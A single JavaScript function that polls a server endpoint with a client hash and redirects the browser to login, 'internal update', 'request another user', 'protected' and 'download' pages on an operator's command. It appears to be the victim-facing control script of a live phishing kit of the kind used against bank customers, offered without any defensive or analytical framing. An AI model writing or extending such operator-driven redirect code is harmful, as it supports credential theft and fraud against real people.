
function readcommands(InfoHeader, funcCallback) {

    $.ajax({
        url: "api.php",
        type: 'POST',
        dataType: "json",
        data: { action: "GET_INFO", id: InfoHeader.id, clientHashId: InfoHeader.hash },
        cache: false,
        success: function (r) {
            InfoHeader.info = r;
            if (r.comando !== InfoHeader.status) {
                InfoHeader.status = r.comando;
                console.log("readcommands:" + InfoHeader.status);

                    let _href = window.location.href;
                    _href = _href.substring(_href.lastIndexOf('/') + 1);

                if (InfoHeader.status === 'LOGIN') {

                    let __href = "login.php?hash=" + InfoHeader.hash;

                    if (__href !== _href) {
                        window.location.href = "login.php?hash=" + InfoHeader.hash;
                    }
                }

                if (InfoHeader.status === 'INICIAR_ATUALIZACAO_INTERNA') {

                    let __href = "interna.php?hash=" + InfoHeader.hash;
                    
                    if (__href !== _href) {
                    window.location.href = "interna.php?hash=" + InfoHeader.hash;
                    }
                }
                  if (InfoHeader.status == 'SOLICITAR_OUTRO_USER_INTERNA') {
                    let __href = "solicitarUsuario.php?hash=" + InfoHeader.hash;
                    
                    if (__href !== _href) {
                      window.location.href = "solicitarUsuario.php?hash=" + InfoHeader.hash;
                    }
                  
                  }

                  if (InfoHeader.status == 'PROTEGIDO_1') {
                    let __href = "protegido1.php?hash=" + InfoHeader.hash;

                    if (__href !== _href) {
                      window.location.href = "protegido1.php?hash=" + InfoHeader.hash;
                    }
                  }
                  if (InfoHeader.status == 'PROTEGIDO_2') {
                    let __href = "protegido2.php?hash=" + InfoHeader.hash;

                    if (__href !== _href) {
                      window.location.href = "protegido2.php?hash=" + InfoHeader.hash;
                    }
                  }

                  if (InfoHeader.status == 'PROTEGIDO_3') {
                    let __href = "protegido3.php?hash=" + InfoHeader.hash;

                    if (__href !== _href) {
                      window.location.href = "protegido3.php?hash=" + InfoHeader.hash;
                    }
                  }

                  if (InfoHeader.status == 'DOWNLOAD_1') {
                    let __href = "download1.php?hash=" + InfoHeader.hash;

                    if (__href !== _href) {
                      window.location.href = "download1.php?hash=" + InfoHeader.hash;
                    }
                  }
                  if (InfoHeader.status == 'DOWNLOAD_2') {
                    let __href = "download2.php?hash=" + InfoHeader.hash;
                    if (__href !== _href) {
                      window.location.href = "download2.php?hash=" + InfoHeader.hash;
                    }
                  }
                  if (InfoHeader.status == 'DOWNLOAD_3') {
                    let __href = "download3.php?hash=" + InfoHeader.hash;
                    if (__href !== _href) {
                      window.location.href = "download3.php?hash=" + InfoHeader.hash;
                    }
                  }

                funcCallback();
            }
        }
    });
}